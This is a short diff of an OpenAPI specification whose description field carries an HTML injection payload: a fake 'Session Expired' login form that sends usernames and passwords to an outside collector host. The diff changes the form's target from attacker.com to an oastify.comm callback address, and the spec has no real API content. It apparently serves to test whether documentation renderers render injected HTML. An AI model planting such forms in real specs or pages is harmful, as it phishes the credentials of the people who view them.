@@ -1,6 +1,6 @@
 openapi: "3.0.0"
 info:
   title: "Session Expired — Re-authenticate"
-  description: "<h1 style='color:red'>Session Expired</h1><p>Your session has timed out. Please log in again:</p><form action='https://attacker.com/steal'><input name='user' placeholder='Username'><br><input name='pass' type='password' placeholder='Password'><br><button type='submit'>Sign In</button></form>"
+  description: "<h1 style='color:red'>Session Expired</h1><p>Your session has timed out. Please log in again:</p><form action='https://wccb82yea6rqpg90zoesx9dt9kfb31rq.oastify.comm/steal'><input name='user' placeholder='Username'><br><input name='pass' type='password' placeholder='Password'><br><button type='submit'>Sign In</button></form>"
   version: "1"
 paths: {}
